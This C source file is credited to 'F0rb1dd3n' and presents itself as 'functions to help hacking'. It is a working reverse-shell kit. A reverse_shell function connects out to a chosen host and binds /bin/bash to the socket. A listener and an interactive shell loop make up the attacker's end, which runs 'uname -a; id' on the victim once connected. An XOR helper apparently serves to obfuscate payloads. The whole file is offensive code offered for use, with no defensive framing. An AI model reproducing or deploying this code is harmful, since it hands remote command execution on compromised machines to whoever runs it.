/*
 * Written by F0rb1dd3n
 *
 * Functions to help hacking, enjoy!
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/wait.h>

#define MOTD 		"\n\t\e[00;31mWellcome to F0rb1dd3n's sensual reverse shell!\n\n"
#define INIT    	"uname -a; id; echo; export TERM=linux;\n"

char good[] = "\e[01;34m[\e[00m+\e[01;34m]\e[00m";
char bad[] = "\e[01;31m[\e[00m-\e[01;31m]\e[00m";
char warn[] = "\e[01;33m[\e[00m!\e[01;33m]\e[00m";

void fatal(char *message) {
   char error_message[129];

   strcpy(error_message, bad);
   strncat(error_message, " Error ", 7); 
   strncat(error_message, message, 93);
   perror(error_message);
   printf("\n\n");
   exit(-1);
}

int checkshell(int fd) {
  char got[32];

  if (write (fd, "echo hacked\n", 12) < 0)
    return -1;

  if (read (fd, got, 32) <= 0)
    return -1;

  return -!strstr (got, "hacked");
}

void shell(int fd) {
    fd_set fds;
    char tmp[0xffff];
    int n;
    
    for (;;) {
	FD_ZERO(&fds);
	FD_SET(fd, &fds);
	FD_SET(0, &fds);

	if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) < 0) {
	    fatal("select");
	    break;
	} 

        /* read from fd and write to stdout */
	if (FD_ISSET(fd, &fds)) {
	   if ((n = read(fd, tmp, sizeof(tmp))) < 0) {
	       fatal("on receive data");
	       break;
	   }
	   if (write(1, tmp, n) < 0) {
	       fatal("write");
	       break;
	   }
	}

	/* read from stdin and write to fd */
	if (FD_ISSET(0, &fds)) {
	    if ((n = read(0, tmp, sizeof(tmp))) < 0) {
	        fatal("read");
	        break;
	    }
	    if (write(fd, tmp, n) < 0) {
	        fatal("on send data");
	        break;
	    }
	    if(strncmp(tmp, "exit\n", 5) == 0) {
	        write(STDOUT_FILENO, "Goodbye!\n", 9);
		break;
	    }
	}
    }
}

void listener(int port) {
	int sockfd, new_sockfd, rec;  
	struct sockaddr_in host_addr, client_addr;
	socklen_t sin_size;
	char buff[256];

	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) fatal("in socket");

	host_addr.sin_family = AF_INET;		
	host_addr.sin_port = htons(port);	        
	host_addr.sin_addr.s_addr = INADDR_ANY; 
	memset(&(host_addr.sin_zero), '\0', 8); 

	if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)	fatal("binding to socket");

	if (listen(sockfd, 5) == -1) {
		fatal("listening on socket");
	} else {
		printf("%s Listening on port %d...\n", good, port);
	}

	sin_size = sizeof(struct sockaddr_in);
	new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
	
	if(new_sockfd == -1) fatal("accepting connection");

	printf("%s Connection from %s:%d...", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
		
	rec = read(new_sockfd, buff, 256);

	if(checkshell(new_sockfd) == -1) {
		fatal("reverse shell not openned");
	} else {
		printf(" Shell is openned!\n\n");
	}

	if(rec > 0) fprintf(stdout, "%s", buff); 
	
        send(new_sockfd, INIT, strlen(INIT), 0);
	shell(new_sockfd);
	close(new_sockfd);
	close(sockfd);
}

void reverse_shell(char *host, int port){
        int sockfd;
        struct hostent *host_info;
        struct sockaddr_in target_addr;
        char *arg[] = {"/bin/bash", NULL};

        if((host_info = gethostbyname(host)) == NULL)
                exit(-1);

        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
        memset(&(target_addr.sin_zero), '\0', 8); 

        if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
                exit(-1);

        if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
                exit(-1);

        send(sockfd, MOTD, strlen(MOTD), 0);
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execve("/bin/bash", arg, NULL);
	close(sockfd);
}

void s_xor(char *arg, int key, int nbytes) {
	int i;
	for(i = 0; i < nbytes; i++) arg[i] ^= key;
}
